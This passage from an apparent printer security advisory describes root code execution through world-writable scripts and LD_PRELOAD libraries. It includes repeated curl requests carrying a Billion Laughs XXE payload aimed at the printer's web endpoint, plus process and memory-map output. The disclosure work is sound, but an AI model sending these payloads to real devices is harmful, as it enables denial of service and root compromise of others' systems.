EXE_NAME=`gdb -c "$1" -x /tmp/gdb_commands.txt | grep "Core was generated by" | cut -d'\`' -f2 | cut -d' ' -f1`
echo "thread apply all backtrace full" &gt; /tmp/gdb_commands.txt
echo "set print asm" &gt;&gt; /tmp/gdb_commands.txt
echo "set print demangle on" &gt;&gt; /tmp/gdb_commands.txt
echo "disassemble" &gt;&gt; /tmp/gdb_commands.txt
echo "info reg" &gt;&gt; /tmp/gdb_commands.txt
echo "quit" &gt;&gt; /tmp/gdb_commands.txt
echo "quit" &gt;&gt; /tmp/gdb_commands.txt
if [ "$EXE_NAME" = ""  ];then
if [ -d /work/log/platform/syscallerr/core_files ];then
mv "$1" /work/log/platform/syscallerr/core_files/
else
mkdir -p /work/log/platform/syscallerr/core_files
mv "$1" /work/log/platform/syscallerr/core_files/
fi
else
if [ -f $EXE_NAME  ];then
gdb $EXE_NAME "$1" --batch --command=/tmp/gdb_commands.txt 2&gt;&amp;1
elif [ -f $EB2/bin/$EXE_NAME ]; then
gdb $EB2/bin/$EXE_NAME "$1" --batch --command=/tmp/gdb_commands.txt 2&gt;&amp;1
elif [ "$EXE_NAME"="(wsgi:webapi)" -o "$EXE_NAME"="(wsgi:webpanel)" -o "$EXE_NAME"="(wsgi:topaccesspy)" ]; then
EXE_NAME=/usr/local/ebx/httpd_worker/bin/httpd_worker
gdb $EXE_NAME "$1" --batch --command=/tmp/gdb_commands.txt 2&gt;&amp;1
else
if [ -d /work/log/platform/syscallerr/core_files ];then
mv "$1" /work/log/platform/syscallerr/core_files/
else
mkdir -p /work/log/platform/syscallerr/core_files
mv "$1" /work/log/platform/syscallerr/core_files/
fi
fi
fi
IFS=${OIFS}
bash-4.1#
</code></pre>
<p>The <code>/tmp/gdb_commands.txt</code> gdb script (used by gdb in the <code>/tmp/backtraceScript.sh</code> script) can be also overwritten by an attacker to contain gdb commands and get Remote Code Execution.</p>
<p>An attacker can change the <code>/tmp/backtraceScript.sh</code> to get Remote Code Execution.</p>
<p>An attacker can change the <code>/tmp/gdb_commands.txt</code> script to get Remote Code Execution.</p>
<p><a id="pre-auth-rce-upload-sapphost"></a></p>
<h3>Remote Code Execution - Upload of a malicious <code>/home/SYSROM_SRC/build/common/bin/sapphost.py</code> program</h3>
<p>The program <code>/home/SYSROM_SRC/build/release/bin/sapphost.py</code> runs as root when the printer starts:</p>
<pre><code>bash-4.1# ps auxww|grep python
root      3984  5.0  5.3 200160 70944 ?        Sl   18:49   0:03 python /home/SYSROM_SRC/build/release/bin/sapphost.py 10000000-0000-0000-0000-500000000000
root      4597  4.5  3.5 144312 47740 ?        Sl   18:49   0:02 python /home/SYSROM_SRC/build/release/bin/sapphost.py 10000000-0000-0000-0000-500000000001
root      5193  0.0  0.1  12616  1852 ?        S    18:50   0:00 grep python
bash-4.1#
</code></pre>
<p><code>/home/SYSROM_SRC/build/release/bin/sapphost.py</code> is a symbolic link to <code>/home/SYSROM_SRC/build/common/bin/sapphost.py</code> and this Python program has insecure permissions, allowing any local user or any remote attacker leveraging the insecure file upload vulnerability to overwrite it: </p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/build/release/bin/sapphost.py
lrwxrwxrwx 1 root root 32 Mar 15 11:44 /home/SYSROM_SRC/build/release/bin/sapphost.py -> ../../thirdparty/bin/sapphost.py
bash-4.1# ls -la /home/SYSROM_SRC/build/thirdparty/bin/sapphost.py
lrwxrwxrwx 1 root root 28 Mar 15 11:44 /home/SYSROM_SRC/build/thirdparty/bin/sapphost.py -> ../../common/bin/sapphost.py
bash-4.1# ls -la /home/SYSROM_SRC/build/common/bin/sapphost.py
<font color=red>-rwxrwxrwx 1 root root 2124 Oct 12  2021 /home/SYSROM_SRC/build/common/bin/sapphost.py</font>
</pre>

<p>An attacker can overwrite this Python code to get Remote Code Execution when the printer starts.</p>
<p><a id="pre-auth-rce-libs"></a></p>
<h3>Remote Code Execution - Upload of malicious libraries</h3>
<p>When analyzing the processes running in the printers, it appears the <code>LD_PRELOAD</code> variable is used to load specific shared libraries:</p>
<ul>
<li><code>/ramdisk/al/libGetNameInfoInterface.so</code></li>
<li><code>/ramdisk/al/libGetAddtInfoInterface.so</code></li>
</ul>
<p>We can find the <code>LD_PRELOAD</code> variable set by default in programs running in the printers:</p>
<pre><code>bash-4.1# printenv | grep LD_PRELO
LD_PRELOAD=/ramdisk/al/libGetNameInfoInterface.so:/ramdisk/al/libGetAddtInfoInterface.so:
bash-4.1# ls -la /ramdisk/al/libGetNameInfoInterface.so
-rwxrwxrwx 1 root root 70813 Dec  6 02:02 /ramdisk/al/libGetNameInfoInterface.so
bash-4.1# s -la /ramdisk/al/libGetAddtInfoInterface.so
-rwxrwxrwx 1 root root 87311 Dec  6 02:02 /ramdisk/al/libGetAddtInfoInterface.so
bash-4.1#
</code></pre>
<p>For example, when sending 55 HTTP requests to the printers, new Apache processes running as root will be created on the fly by the printer, as shown below. These new processes will load and execute code from <code>libGetNameInfoInterface.so</code> and <code>libGetAddtInfoInterface.so</code>. An attacker can rewrite any file over them to get Remote Code Execution.</p>
<p>Using the HTTP request from the <a href="#pre-auth-xxe-dos">Pre-authenticated Blind XML External Entity (XXE) injection - DoS</a>, we will send 55 HTTP requests (only the last 3 are displayed) containing the Billion-Laugh Attack, to create new Apache processes in the remote printer:</p>
<pre><code>kali% curl -i -s -k -X $'POST' \
    -H $'Host: 10.0.0.1:8080' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Cache-Control: no-cache' -H $'Pragma: no-cache' -H $'Content-Type: text/plain; charset=utf-8' -H $'csrfpId: 10.0.0.1.852d519a6fa9825fae857bac5c003da0' -H $'Content-Length: 760' -H $'Origin: http://10.0.0.1:8080' -H $'Connection: close' -H $'Referer: http://10.0.0.1:8080/?MAIN=TOPACCESS' \
    -b $'Session=10.0.0.2.852d519a6fa9825fae857bac5c003da0; Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DLOGS%26SUB%3DJOBLOGS%26CAT%3DPRINT' \
    --data-binary $'&lt;!DOCTYPE lolz [\x0d\x0a &lt;!ENTITY lol \"lol\"&gt;\x0d\x0a &lt;!ELEMENT lolz (#PCDATA)&gt;\x0d\x0a &lt;!ENTITY lol1 \"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;\"&gt;\x0d\x0a &lt;!ENTITY lol2 \"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;\"&gt;\x0d\x0a &lt;!ENTITY lol3 \"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;\"&gt;\x0d\x0a &lt;!ENTITY lol4 \"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;\"&gt;\x0d\x0a &lt;!ENTITY lol5 \"&amp;lol4;&amp;lol4;&amp;lol4;\"&gt;\x0d\x0a &lt;!ENTITY lol6 \"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;\"&gt;\x0d\x0a &lt;!ENTITY lol7 \"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;\"&gt;\x0d\x0a &lt;!ENTITY lol8 \"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;\"&gt;\x0d\x0a &lt;!ENTITY lol9 \"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;\"&gt;\x0d\x0a]&gt;\x0d\x0a&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;' \
    $'http://10.0.0.1:8080/contentwebserver' &amp;
[53] 2286190

kali% curl -i -s -k -X $'POST' \
    -H $'Host: 10.0.0.1:8080' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Cache-Control: no-cache' -H $'Pragma: no-cache' -H $'Content-Type: text/plain; charset=utf-8' -H $'csrfpId: 10.0.0.1.852d519a6fa9825fae857bac5c003da0' -H $'Content-Length: 760' -H $'Origin: http://10.0.0.1:8080' -H $'Connection: close' -H $'Referer: http://10.0.0.1:8080/?MAIN=TOPACCESS' \
    -b $'Session=10.0.0.2.852d519a6fa9825fae857bac5c003da0; Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DLOGS%26SUB%3DJOBLOGS%26CAT%3DPRINT' \
    --data-binary $'&lt;!DOCTYPE lolz [\x0d\x0a &lt;!ENTITY lol \"lol\"&gt;\x0d\x0a &lt;!ELEMENT lolz (#PCDATA)&gt;\x0d\x0a &lt;!ENTITY lol1 \"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;\"&gt;\x0d\x0a &lt;!ENTITY lol2 \"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;\"&gt;\x0d\x0a &lt;!ENTITY lol3 \"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;\"&gt;\x0d\x0a &lt;!ENTITY lol4 \"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;\"&gt;\x0d\x0a &lt;!ENTITY lol5 \"&amp;lol4;&amp;lol4;&amp;lol4;\"&gt;\x0d\x0a &lt;!ENTITY lol6 \"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;\"&gt;\x0d\x0a &lt;!ENTITY lol7 \"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;\"&gt;\x0d\x0a &lt;!ENTITY lol8 \"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;\"&gt;\x0d\x0a &lt;!ENTITY lol9 \"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;\"&gt;\x0d\x0a]&gt;\x0d\x0a&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;' \
    $'http://10.0.0.1:8080/contentwebserver' &amp;
[54] 2286192

kali% curl -i -s -k -X $'POST' \
    -H $'Host: 10.0.0.1:8080' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Cache-Control: no-cache' -H $'Pragma: no-cache' -H $'Content-Type: text/plain; charset=utf-8' -H $'csrfpId: 10.0.0.1.852d519a6fa9825fae857bac5c003da0' -H $'Content-Length: 760' -H $'Origin: http://10.0.0.1:8080' -H $'Connection: close' -H $'Referer: http://10.0.0.1:8080/?MAIN=TOPACCESS' \
    -b $'Session=10.0.0.2.852d519a6fa9825fae857bac5c003da0; Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DLOGS%26SUB%3DJOBLOGS%26CAT%3DPRINT' \
    --data-binary $'&lt;!DOCTYPE lolz [\x0d\x0a &lt;!ENTITY lol \"lol\"&gt;\x0d\x0a &lt;!ELEMENT lolz (#PCDATA)&gt;\x0d\x0a &lt;!ENTITY lol1 \"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;\"&gt;\x0d\x0a &lt;!ENTITY lol2 \"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;\"&gt;\x0d\x0a &lt;!ENTITY lol3 \"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;\"&gt;\x0d\x0a &lt;!ENTITY lol4 \"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;\"&gt;\x0d\x0a &lt;!ENTITY lol5 \"&amp;lol4;&amp;lol4;&amp;lol4;\"&gt;\x0d\x0a &lt;!ENTITY lol6 \"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;\"&gt;\x0d\x0a &lt;!ENTITY lol7 \"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;\"&gt;\x0d\x0a &lt;!ENTITY lol8 \"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;\"&gt;\x0d\x0a &lt;!ENTITY lol9 \"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;\"&gt;\x0d\x0a]&gt;\x0d\x0a&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;' \
    $'http://10.0.0.1:8080/contentwebserver' &amp;
[55] 2286194
</code></pre>
<p>We can find that new Apache processes are created using <code>LD_PRELOAD</code> variables on the remote printer:</p>
<pre><code>2023/05/27 11:31:42 CMD: UID=0     PID=4132   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:42 CMD: UID=0     PID=4131   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:42 CMD: UID=0     PID=4130   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:42 CMD: UID=0     PID=4129   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4138   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4137   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4136   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4135   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4134   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4133   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4139   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4140   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:44 CMD: UID=0     PID=4141   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh &amp;&amp; chmod +x /root/sshd_start.sh &amp;&amp; /root/sshd_start.sh &amp;&amp; rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi
2023/05/27 11:31:44 CMD: UID=0     PID=4142   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh &amp;&amp; chmod +x /root/sshd_start.sh &amp;&amp; /root/sshd_start.sh &amp;&amp; rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi
2023/05/27 11:31:45 CMD: UID=0     PID=4143   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:46 CMD: UID=0     PID=4145   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:46 CMD: UID=0     PID=4144   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:47 CMD: UID=0     PID=4146   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh &amp;&amp; chmod +x /root/sshd_start.sh &amp;&amp; /root/sshd_start.sh &amp;&amp; rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi
2023/05/27 11:31:47 CMD: UID=0     PID=4147   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh &amp;&amp; chmod +x /root/sshd_start.sh &amp;&amp; /root/sshd_start.sh &amp;&amp; rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi
2023/05/27 11:31:47 CMD: UID=0     PID=4151   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:47 CMD: UID=0     PID=4150   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:47 CMD: UID=0     PID=4149   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:47 CMD: UID=0     PID=4148   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:48 CMD: UID=0     PID=4156   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:48 CMD: UID=0     PID=4155   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:48 CMD: UID=0     PID=4154   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:48 CMD: UID=0     PID=4153   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:48 CMD: UID=0     PID=4152   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:48 CMD: UID=0     PID=4158   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
</code></pre>
<p>We can analyze a newly-created Apache process. For example, the Apache process with the PID 4129 will have some libraries loaded in order to execute code implemented in these libraries:</p>
<pre><code>bash-4.1# cat /proc/4129/maps
08048000-080bb000 r-xp 00000000 08:02 155908     /home/SYSROM_SRC/build/thirdparty/bin/httpd
080bb000-080bf000 rw-p 00072000 08:02 155908     /home/SYSROM_SRC/build/thirdparty/bin/httpd
080bf000-0833e000 rw-p 00000000 00:00 0          [heap]
0833e000-08360000 rw-p 00000000 00:00 0          [heap]
08360000-083e8000 rw-p 00000000 00:00 0          [heap]
4bc47000-4bc63000 r-xp 00000000 08:02 11770      /lib/ld-2.11.3.so
4bc63000-4bc64000 r--p 0001b000 08:02 11770      /lib/ld-2.11.3.so
4bc64000-4bc65000 rw-p 0001c000 08:02 11770      /lib/ld-2.11.3.so
4bc67000-4bda6000 r-xp 00000000 08:02 11750      /lib/libc-2.11.3.so
4bda6000-4bda7000 ---p 0013f000 08:02 11750      /lib/libc-2.11.3.so
4bda7000-4bda9000 r--p 0013f000 08:02 11750      /lib/libc-2.11.3.so
4bda9000-4bdaa000 rw-p 00141000 08:02 11750      /lib/libc-2.11.3.so
4bdaa000-4bdad000 rw-p 00000000 00:00 0
4bdaf000-4bdb1000 r-xp 00000000 08:02 11665      /lib/libdl-2.11.3.so
4bdb1000-4bdb2000 r--p 00001000 08:02 11665      /lib/libdl-2.11.3.so
4bdb2000-4bdb3000 rw-p 00002000 08:02 11665      /lib/libdl-2.11.3.so
4bdbf000-4bddf000 r-xp 00000000 08:02 139743     /usr/lib/libpcre.so.3.12.1
4bddf000-4bde0000 rw-p 0001f000 08:02 139743     /usr/lib/libpcre.so.3.12.1
4bdee000-4bdf0000 r-xp 00000000 08:02 144969     /usr/lib/libcom_err.so.2.1
4bdf0000-4bdf1000 rw-p 00001000 08:02 144969     /usr/lib/libcom_err.so.2.1
4bdfa000-4be0c000 r-xp 00000000 08:02 145525     /usr/lib/libz.so.1.2.3
4be0c000-4be0d000 rw-p 00011000 08:02 145525     /usr/lib/libz.so.1.2.3
4be0f000-4be12000 r-xp 00000000 08:02 144902     /usr/lib/libuuid.so.1.3.0
4be12000-4be13000 rw-p 00002000 08:02 144902     /usr/lib/libuuid.so.1.3.0
4be15000-4be1c000 r-xp 00000000 08:02 11732      /lib/librt-2.11.3.so
4be1c000-4be1d000 r--p 00006000 08:02 11732      /lib/librt-2.11.3.so
4be1d000-4be1e000 rw-p 00007000 08:02 11732      /lib/librt-2.11.3.so
4be7e000-4be9f000 r-xp 00000000 08:02 142900     /usr/lib/libk5crypto.so.3.1
4be9f000-4bea0000 rw-p 00021000 08:02 142900     /usr/lib/libk5crypto.so.3.1
4bea7000-4bead000 r-xp 00000000 08:02 140031     /usr/lib/libkrb5support.so.0.1
4bead000-4beae000 rw-p 00005000 08:02 140031     /usr/lib/libkrb5support.so.0.1
4c04f000-4c133000 r-xp 00000000 08:02 145085     /usr/lib/libstdc++.so.6.0.13
4c133000-4c137000 r--p 000e4000 08:02 145085     /usr/lib/libstdc++.so.6.0.13
4c137000-4c138000 rw-p 000e8000 08:02 145085     /usr/lib/libstdc++.so.6.0.13
...
710a3000-710a5000 r-xp 00000000 08:02 153564     /home/SYSROM_SRC/build/thirdparty/lib/mod_authn_file.so
710a5000-710a6000 rw-p 00001000 08:02 153564     /home/SYSROM_SRC/build/thirdparty/lib/mod_authn_file.so
710a6000-710a9000 r-xp 00000000 08:02 154158     /home/SYSROM_SRC/build/thirdparty/lib/mod_authn_core.so
710a9000-710aa000 rw-p 00002000 08:02 154158     /home/SYSROM_SRC/build/thirdparty/lib/mod_authn_core.so
710aa000-710b4000 r-xp 00000000 08:02 154478     /home/SYSROM_SRC/build/thirdparty/lib/mod_dav_fs.so
710b4000-710b5000 rw-p 00009000 08:02 154478     /home/SYSROM_SRC/build/thirdparty/lib/mod_dav_fs.so
...
75674000-75677000 r--p 00064000 08:02 153751     /home/SYSROM_SRC/build/thirdparty/lib/libssl.so.1.0.0
75677000-7567b000 rw-p 00067000 08:02 153751     /home/SYSROM_SRC/build/thirdparty/lib/libssl.so.1.0.0
7567b000-756b0000 r-xp 00000000 08:02 154613     /home/SYSROM_SRC/build/thirdparty/lib/libldap-2.4.so.2.5.6
756b0000-756b3000 rw-p 00034000 08:02 154613     /home/SYSROM_SRC/build/thirdparty/lib/libldap-2.4.so.2.5.6
756b3000-756bd000 r-xp 00000000 08:02 11632      /lib/libpam.so.0.82.2
756bd000-756be000 rw-p 0000a000 08:02 11632      /lib/libpam.so.0.82.2
756be000-76217000 r-xp 00000000 08:02 21362      /home/SYSROM_SRC/build/release/lib/libssdk.so.0.0.0
76217000-76258000 rw-p 00b58000 08:02 21362      /home/SYSROM_SRC/build/release/lib/libssdk.so.0.0.0
76258000-7625f000 rw-p 00000000 00:00 0
7625f000-7626a000 r-xp 00000000 08:02 20801      /home/SYSROM_SRC/build/release/lib/libcimsg.so.0
7626a000-7626b000 rw-p 0000a000 08:02 20801      /home/SYSROM_SRC/build/release/lib/libcimsg.so.0
7626b000-76273000 r-xp 00000000 08:02 20878      /home/SYSROM_SRC/build/release/lib/mod_efiwebserver.so.0
76273000-76274000 rw-p 00007000 08:02 20878      /home/SYSROM_SRC/build/release/lib/mod_efiwebserver.so.0
76274000-76275000 ---p 00000000 00:00 0
76275000-76a74000 rwxp 00000000 00:00 0
76a74000-76a77000 rw-p 00000000 00:00 0
76a77000-76a7b000 r-xp 00000000 08:02 11633      /lib/libattr.so.1.1.0
76a7b000-76a7c000 rw-p 00003000 08:02 11633      /lib/libattr.so.1.1.0
76a7c000-76a82000 r-xp 00000000 08:02 11721      /lib/libacl.so.1.1.0
76a82000-76a83000 rw-p 00005000 08:02 11721      /lib/libacl.so.1.1.0
76a83000-76a84000 rw-p 00000000 00:00 0
76a84000-76af3000 r-xp 00000000 08:02 21782      /home/SYSROM_SRC/build/release/lib/libcios.so.0
76af3000-76af7000 rw-p 0006f000 08:02 21782      /home/SYSROM_SRC/build/release/lib/libcios.so.0
76af7000-76b50000 r-xp 00000000 08:02 145519     /usr/lib/libintlc.so.5
76b50000-76b53000 rw-p 00059000 08:02 145519     /usr/lib/libintlc.so.5
76b53000-76b5c000 r-xp 00000000 08:02 11622      /lib/libcrypt-2.11.3.so
76b5c000-76b5d000 r--p 00008000 08:02 11622      /lib/libcrypt-2.11.3.so
76b5d000-76b5e000 rw-p 00009000 08:02 11622      /lib/libcrypt-2.11.3.so
76b5e000-76b85000 rw-p 00000000 00:00 0
76b85000-76b97000 r-xp 00000000 08:02 154448     /home/SYSROM_SRC/build/thirdparty/lib/libroken.so.18.1.0
76b97000-76b98000 rw-p 00012000 08:02 154448     /home/SYSROM_SRC/build/thirdparty/lib/libroken.so.18.1.0
76b98000-76b99000 rw-p 00000000 00:00 0
76b99000-76b9c000 r-xp 00000000 08:02 154186     /home/SYSROM_SRC/build/thirdparty/lib/libcom_err.so.1.1.3
76b9c000-76b9d000 rw-p 00002000 08:02 154186     /home/SYSROM_SRC/build/thirdparty/lib/libcom_err.so.1.1.3
76b9d000-76bc4000 r-xp 00000000 08:02 154600     /home/SYSROM_SRC/build/thirdparty/lib/libwind.so.0.0.0
76bc4000-76bc5000 rw-p 00027000 08:02 154600     /home/SYSROM_SRC/build/thirdparty/lib/libwind.so.0.0.0
76bc5000-76c64000 r-xp 00000000 08:02 154326     /home/SYSROM_SRC/build/thirdparty/lib/libasn1.so.8.0.0
76c64000-76c67000 rw-p 0009f000 08:02 154326     /home/SYSROM_SRC/build/thirdparty/lib/libasn1.so.8.0.0
76c67000-76c96000 r-xp 00000000 08:02 153499     /home/SYSROM_SRC/build/thirdparty/lib/libhcrypto.so.4.1.0
76c96000-76c99000 rw-p 0002e000 08:02 153499     /home/SYSROM_SRC/build/thirdparty/lib/libhcrypto.so.4.1.0
76c99000-76c9a000 rw-p 00000000 00:00 0
76c9a000-76d0b000 r-xp 00000000 08:02 153648     /home/SYSROM_SRC/build/thirdparty/lib/libheimsqlite.so.0.0.0
76d0b000-76d0d000 rw-p 00070000 08:02 153648     /home/SYSROM_SRC/build/thirdparty/lib/libheimsqlite.so.0.0.0
76d0d000-76d0e000 rw-p 00000000 00:00 0
76d0e000-76d4d000 r-xp 00000000 08:02 154400     /home/SYSROM_SRC/build/thirdparty/lib/libhx509.so.5.0.0
76d4d000-76d4f000 rw-p 0003f000 08:02 154400     /home/SYSROM_SRC/build/thirdparty/lib/libhx509.so.5.0.0
76d4f000-76d55000 r-xp 00000000 08:02 145615     /usr/lib/libirng.so
76d55000-76d58000 rw-p 00005000 08:02 145615     /usr/lib/libirng.so
76d58000-76d6b000 r-xp 00000000 08:02 21737      /home/SYSROM_SRC/build/release/lib/libllmnrclient.so.0
76d6b000-76d6c000 rw-p 00012000 08:02 21737      /home/SYSROM_SRC/build/release/lib/libllmnrclient.so.0
76d6c000-77568000 r-xp 00000000 08:02 157246     /mfp/lib/libsvml.so
77568000-77586000 rw-p 007fc000 08:02 157246     /mfp/lib/libsvml.so
77586000-77587000 rw-p 00000000 00:00 0
77587000-775ad000 r-xp 00000000 08:02 11746      /lib/libm-2.11.3.so
775ad000-775ae000 r--p 00025000 08:02 11746      /lib/libm-2.11.3.so
775ae000-775af000 rw-p 00026000 08:02 11746      /lib/libm-2.11.3.so
775af000-77624000 r-xp 00000000 08:02 145632     /usr/lib/libsqlite3.so.0.8.6
77624000-77626000 rw-p 00074000 08:02 145632     /usr/lib/libsqlite3.so.0.8.6
77626000-77627000 rw-p 00000000 00:00 0
77627000-77695000 r-xp 00000000 08:02 154620     /home/SYSROM_SRC/build/thirdparty/lib/libkrb5.so.25.0.0
77695000-77698000 rw-p 0006e000 08:02 154620     /home/SYSROM_SRC/build/thirdparty/lib/libkrb5.so.25.0.0
77698000-776ad000 r-xp 00000000 08:02 11629      /lib/libpthread-2.11.3.so
776ad000-776ae000 r--p 00014000 08:02 11629      /lib/libpthread-2.11.3.so
776ae000-776af000 rw-p 00015000 08:02 11629      /lib/libpthread-2.11.3.so
776af000-776b2000 rw-p 00000000 00:00 0
776b2000-776db000 r-xp 00000000 08:02 153455     /home/SYSROM_SRC/build/thirdparty/lib/libapr-1.so.0.7.0
776db000-776dd000 rw-p 00028000 08:02 153455     /home/SYSROM_SRC/build/thirdparty/lib/libapr-1.so.0.7.0
776dd000-776fb000 r-xp 00000000 08:02 154622     /home/SYSROM_SRC/build/thirdparty/lib/libaprutil-1.so.0.6.1
